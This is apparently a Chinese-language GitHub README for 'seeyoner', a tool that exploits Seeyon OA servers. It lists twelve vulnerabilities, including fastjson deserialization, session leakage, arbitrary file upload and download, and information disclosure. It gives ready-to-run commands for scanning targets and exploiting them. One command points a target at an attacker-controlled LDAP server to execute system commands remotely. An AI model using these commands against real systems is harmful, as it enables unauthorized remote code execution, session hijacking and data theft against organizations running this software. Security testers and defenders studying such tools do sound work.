# seeyoner
致远OA漏洞利用工具
## Usage
```
D:\>seeyoner.exe -h
        seeyoner v1.0 by xwuyi
Usage：seeyoner.exe -u http://192.168.1.1:8080/ -vn all -m scan
Options:
  -a string
        run mode ldap args
  -c string
        run mode command args
  -h    print this help info.
  -m string
        mode：scan/run
  -show
        show vuln list.
  -u string
        target url.
  -vn string
        vuln number，[1,2,...]
Usage：seeyoner.exe -u http://192.168.1.1:8080/ -vn 1 -m scan
```
### scan
全漏洞探测：
```
seeyoner.exe -u http://xxx.com -vn all -m scan
```
![image](https://user-images.githubusercontent.com/45651912/124346939-31545880-dc14-11eb-8fa2-7dbb69aae836.png)  
指定漏洞探测：
`-vn`指定漏洞编号，可通过`-show`参数查看：
```
D:\>seeyoner.exe -show

漏洞列表：
1、seeyon<8.0_fastjson反序列化
2、thirdpartyController.do管理员session泄露
3、webmail.do任意文件下载（CNVD-2020-62422）
4、ajax.do未授权&任意文件上传
5、getSessionList泄露Session
6、htmlofficeservlet任意文件上传
7、initDataAssess.jsp信息泄露
8、DownExcelBeanServlet信息泄露
9、createMysql.jsp数据库信息泄露
10、test.jsp路径
11、setextno.jsp路径
12、status.jsp路径（状态监控页面）
```
探测seeyon<8.0_fastjson反序列化漏洞：
```
seeyoner.exe -u http://xxx.com -vn 1 -m scan
```

### run
以Session泄露+zip文件上传解压为例，指定编号为`2`：
```
seeyoner.exe -u http://xxxx.com -vn 2 -m run
```
![image](https://user-images.githubusercontent.com/45651912/124347038-bb9cbc80-dc14-11eb-8e52-e3292588c350.png)  

seeyon<8.0_fastjson反序列化利用起来比较特殊，也只有该漏洞会用到`-a`和`-c`参数：  
`-a`指定你的LDAP服务地址，`-c`指定需要执行的系统命令
```
seeyoner.exe -u http://xxxx.com -vn 1 -m run -a ldap://x.x.x.x:1389/TomcatBypass/TomcatEcho -c whoami
```
![image](https://user-images.githubusercontent.com/45651912/124293426-3ae4ae80-db89-11eb-8a68-def2ba248f8d.png)
  
